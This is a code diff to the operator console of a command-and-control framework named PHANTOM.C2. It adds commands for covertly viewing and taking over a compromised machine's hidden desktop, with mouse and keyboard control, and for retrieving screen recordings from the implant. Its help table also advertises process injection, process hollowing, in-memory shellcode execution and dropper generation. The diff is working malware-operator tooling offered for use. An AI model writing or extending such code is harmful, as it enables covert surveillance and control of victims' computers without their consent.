@@ -1,6 +1,7 @@
 import cmd
 import sys
 import os
+import subprocess
 from datetime import datetime
 from typing import Optional
 
@@ -40,7 +41,7 @@ def build_c2_banner():
   ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚══╝   ╚═╝    ╚═════╝ ╚═╝     ╚═╝
 [/bold magenta]
   [dim]──────────────────────────────────────────────────────────[/dim]
-  [bold magenta]PHANTOM.C2 — Command & Control[/bold magenta]  [dim]v1.0.0[/dim]
+  [bold magenta]PHANTOM.C2 — Command & Control[/bold magenta]  [dim]v3.0.0[/dim]
   [dim]Secure Encrypted Asynchronous Communications[/dim]
 """
 
@@ -657,6 +658,11 @@ class C2Shell(cmd.Cmd):
             ("inject-tl <pid> | inject-eb <pid>", "Thread-layout / early-bird injection variants"),
             ("migrate", "Hollow a new process and move the beacon (1 beacon)"),
             ("mem-run <b64>", "Run base64 shellcode in-memory (Windows)"),
+            ("remote [host] [port] [ssl]", "Deploy the standalone Remote Session module (GUI takeover)"),
+            ("remote-view [gui|off]", "Browser viewer for the remote stream (gui = full control) or ASCII watch"),
+            ("remote-open", "Open the newest full-res remote frame in the image viewer"),
+            ("screen-watch [gui]", "Watch beacon screen recordings: gui = browser player (live + saved)"),
+            ("screen-open [name]", "Open a saved screen recording (mp4) in the OS player"),
             # ── payloads & delivery ──
             ("generate [platform] [--profile <json>]", "Compile + dropper (optionally with malleable profile)"),
             ("generate-shellcode [platform]", "Generate base64 shellcode for inject/migrate/mem-run"),
@@ -670,7 +676,7 @@ class C2Shell(cmd.Cmd):
             table.add_row(cmd, desc)
         console.print(table)
         console.print("[dim]Type 'help <command>' for details.[/]")
-        console.print(f"[dim]PHANTOM.C2 v1.0.0 — {_c2_elapsed()} since session start[/dim]")
+        console.print(f"[dim]PHANTOM.C2 v3.0.0 — {_c2_elapsed()} since session start[/dim]")
 
     def do_beacon_help(self, arg):
         """beacon-help - list commands supported by the C++ beacon agent"""
@@ -776,6 +782,233 @@ class C2Shell(cmd.Cmd):
         console = Console()
         console.print(Panel(b64, title=f"Base64 Shellcode ({platform})", border_style="green"))
         console.print("[dim]Copy this string to use with 'inject <pid> <string>' or 'migrate <string>'[/dim]")
+
+    # ------------------------------------------------------------------
+    # remote-view — live ASCII watch of the Remote Session module stream
+    # (ghost-mode frames have NO monitor on the target: this stream is
+    # the only way to SEE that hidden desktop from the operator box)
+    # ------------------------------------------------------------------
+
+    @staticmethod
+    def _ascii_frame(jpeg_bytes: bytes, width: int = 96) -> str:
+        """Downscale a frame to grayscale ASCII for the terminal."""
+        import io as _io
+        from PIL import Image
+        img = Image.open(_io.BytesIO(jpeg_bytes)).convert("L")
+        w = min(width, img.width)
+        h = max(1, int(img.height / img.width * w * 0.5))  # char aspect ~2:1
+        img = img.resize((w, h))
+        chars = " .:-=+*#%@"
+        px = img.load()
+        lines = []
+        for y in range(h):
+            row = "".join(chars[min(len(chars) - 1, px[x, y] * len(chars) // 256)]
+                          for x in range(w))
+            lines.append(row)
+        return "\n".join(lines)
+
+    def do_remote_view(self, arg):
+        """remote-view [gui|off] — Watch the Remote Session module's stream.
+
+        'gui' (recommended): opens a small browser viewer on 127.0.0.1 —
+        real image, mouse/keyboard control, same experience as the
+        Electron Remote tab. Plain 'remote-view' renders ASCII in the
+        terminal (quick monitoring). 'off' queues 'remote stop'."""
+        if not self.active_beacon:
+            notifier.error("No active beacon. 'interact <R-id>' first.")
+            return
+        arg = (arg or "").strip().lower()
+        if arg == "gui":
+            try:
+                from phantom.core.remote_viewer import launch_viewer
+                port, _thread = launch_viewer(self.active_beacon)
+            except Exception as e:
+                notifier.error(f"Viewer failed to start: {e}")
+                return
+            if port:
+                notifier.success(
+                    f"Remote viewer running at http://127.0.0.1:{port}/ "
+                    "(loopback only — opened in your browser). "
+                    "Mouse/keyboard on the image control the session.")
+            else:
+                notifier.error("Viewer failed to bind a port.")
+            return
+        if arg == "off":
+            task_id = c2_state.queue_task(self.active_beacon, "remote stop")
+            notifier.success("remote stop queued.")
+            return
+        import time, base64, sys
+        try:
+            from PIL import Image  # noqa: F401 — fail early if missing
+        except ImportError:
+            notifier.error("Pillow is required for remote-view (pip install pillow)")
+            return
+        seen: set = set()
+        shown = 0
+        notifier.info("Live view started — press any key (or Ctrl+C) to stop. "
+                      "Frames also save full-res under data/remote/.")
+        try:
+            while True:
+                # any keypress stops the stream
+                try:
+                    if os.name == "nt":
+                        import msvcrt
+                        if msvcrt.kbhit():
+                            msvcrt.getch()
+                            break
+                    else:
+                        import select
+                        if select.select([sys.stdin], [], [], 0)[0]:
+                            sys.stdin.read(1)
+                            break
+                except Exception:
+                    pass
+                for res in c2_state.get_results(self.active_beacon):
+                    out = str(res.get("output", ""))
+                    if not out.startswith("REMOTE_FRAME_B64:"):
+                        continue
+                    tid = res.get("task_id", "")
+                    if tid in seen:
+                        continue
+                    seen.add(tid)
+                    try:
+                        raw = base64.b64decode(out[len("REMOTE_FRAME_B64:"):],
+                                               validate=False)
+                        console.print(self._ascii_frame(raw))
+                        shown += 1
+                    except Exception:
+                        continue
+                time.sleep(1)
+        except KeyboardInterrupt:
+            pass
+        notifier.success(f"Live view stopped ({shown} frame(s) rendered). "
+                         "Full-res frames: data/remote/ — 'remote-open' to view.")
+
+    def do_remote_open(self, arg):
+        """remote-open — open the most recent full-resolution remote frame
+        in the OS image viewer (Ghost workspace at native quality)."""
+        from phantom.utils.paths import data_dir
+        d = os.path.join(data_dir(), "remote")
+        if not os.path.isdir(d):
+            notifier.error("No remote frames yet. Queue 'remote frame' first.")
+            return
+        frames = sorted((f for f in os.listdir(d)
+                         if f.lower().endswith((".jpg", ".jpeg", ".png"))),
+                        reverse=True)
+        if not frames:
+            notifier.error("No remote frames yet. Queue 'remote frame' first.")
+            return
+        path = os.path.join(d, frames[0])
+        try:
+            if os.name == "nt":
+                os.startfile(path)  # noqa: S606 — intentional OS viewer
+            elif sys.platform == "darwin":
+                subprocess.Popen(["open", path])
+            else:
+                subprocess.Popen(["xdg-open", path])
+            notifier.success(f"Opened {frames[0]}")
+        except Exception as e:
+            notifier.error(f"Cannot open {path}: {e}")
+
+    def do_screen_watch(self, arg):
+        """screen-watch [gui] — Watch beacon screen recordings.
+
+        'gui' (recommended): opens a browser player on 127.0.0.1 with the
+        LIVE stream (progressive segments) on one side and all saved
+        recordings (mp4) on the other. Plain 'screen-watch' polls the live
+        segment count in the terminal until a keypress."""
+        arg = (arg or "").strip().lower()
+        if arg == "gui":
+            try:
+                from phantom.core.recordings_viewer import launch_viewer
+                port, _thread = launch_viewer()
+            except Exception as e:
+                notifier.error(f"Recordings viewer failed to start: {e}")
+                return
+            if port:
+                notifier.success(
+                    f"Recordings viewer running at http://127.0.0.1:{port}/ "
+                    "(loopback only — opened in your browser). Live segments "
+                    "appear as they arrive; saved mp4s are listed on the left.")
+            else:
+                notifier.error("Viewer failed to bind a port.")
+            return
+        import sys, time
+        notifier.info("Watching live screen-recording segments — "
+                      "press any key (or Ctrl+C) to stop. "
+                      "'screen-watch gui' for the browser player.")
+        try:
+            while True:
+                try:
+                    if os.name == "nt":
+                        import msvcrt
+                        if msvcrt.kbhit():
+                            msvcrt.getch()
+                            break
+                    else:
+                        import select
+                        if select.select([sys.stdin], [], [], 0)[0]:
+                            sys.stdin.read(1)
+                            break
+                except Exception:
+                    pass
+                from phantom.utils.paths import data_dir
+                root = os.path.join(data_dir(), "recordings", "live")
+                segs = []
+                if os.path.isdir(root):
+                    segs = sorted(f for f in os.listdir(root)
+                                  if f.endswith(".bin"))
+                last = segs[-1] if segs else "—"
+                mp4s = [f for f in (segs and os.listdir(root) or [])
+                        if f.endswith("_live.mp4")]
+                console.print(
+                    f"  [cyan]{len(segs):>4}[/] live segment(s) · "
+                    f"last [green]{last}[/] · "
+                    f"mp4: [{'green' if mp4s else 'red'}]{'ready' if mp4s else 'not yet'}")
+                time.sleep(2)
+        except KeyboardInterrupt:
+            pass
+        notifier.success("Live watch stopped. Saved recordings: "
+                         "data/recordings/ — 'screen-open' to play.")
+
+    def do_screen_open(self, arg):
+        """screen-open [name] — open a saved screen recording (mp4) in the
+        OS video player. Without a name, opens the newest recording."""
+        from phantom.utils.paths import data_dir
+        d = os.path.join(data_dir(), "recordings")
+        if not os.path.isdir(d):
+            notifier.error("No recordings yet. Queue 'screen-record <sec>' "
+                           "or 'screen-dump' on the beacon first.")
+            return
+        recs = sorted((f for f in os.listdir(d)
+                       if f.lower().endswith((".mp4", ".webm", ".mkv"))),
+                      reverse=True)
+        name = (arg or "").strip()
+        if name:
+            candidates = [f for f in recs if f.lower().startswith(name.lower())]
+            if not candidates:
+                notifier.error(f"No recording matches '{name}'. Available: "
+                               + ", ".join(recs[:8] or ["(none)"]))
+                return
+            target = candidates[0]
+        elif not recs:
+            notifier.error("No mp4 recordings saved yet (only raw frame "
+                           "sequences — install ffmpeg on the operator host "
+                           "to mux).")
+            return
+        else:
+            target = recs[0]
+        path = os.path.join(d, target)
+        try:
+            if os.name == "nt":
+                os.startfile(path)  # noqa: S606 — intentional OS player
+            elif sys.platform == "darwin":
+                subprocess.Popen(["open", path])
+            else:
+                subprocess.Popen(["xdg-open", path])
+            notifier.success(f"Opened {target}")
+        except Exception as e:
+            notifier.error(f"Cannot open {path}: {e}")
 
     def _wait_for_result(self, task_id, timeout=30):
         """Helper to poll for a specific task result."""
